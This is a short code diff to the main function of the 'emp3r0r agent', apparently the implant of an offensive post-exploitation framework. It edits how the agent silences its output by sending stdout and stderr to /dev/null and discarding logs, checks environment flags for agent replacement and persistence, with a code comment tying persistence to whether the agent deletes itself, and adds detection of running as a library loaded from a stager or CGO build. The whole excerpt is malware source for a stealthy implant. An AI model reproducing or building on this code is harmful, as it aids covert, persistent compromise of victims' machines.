@@ -39,27 +39,27 @@ func agent_main() {
 		log_file := "emp3r0r.log"
 		f, err := os.OpenFile(log_file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
 		if err != nil {
-			log.Fatalf("[-] Cannot open %s: %v", log_file, err)
+			log.Fatalf("%s: %v", log_file, err)
 		}
 		defer f.Close()
 		log.SetOutput(f)
 		log.Println("emp3r0r agent has started")
 	} else {
-		log.SetOutput(io.Discard)
 		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 		if err != nil {
-			log.Fatalf("[-] Cannot open %s: %v", os.DevNull, err)
+			log.Fatalf("%s: %v", os.DevNull, err)
 		}
 		defer null_file.Close()
 		os.Stderr = null_file
 		os.Stdout = null_file
+		log.SetOutput(io.Discard)
 	}
 
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
 	// self delete or not
 	persistence := os.Getenv("PERSISTENCE") == "true"
-	// are we running from loader.so?
-	is_dll := IsDLL()
+	// are we running as a library? Either from stager.so or CGO library
+	is_dll := IsDLL() || os.Getenv("LD") == "true"
 	if is_dll {
 		// we don't want to delete the process executable if we are just a DLL
 		persistence = true
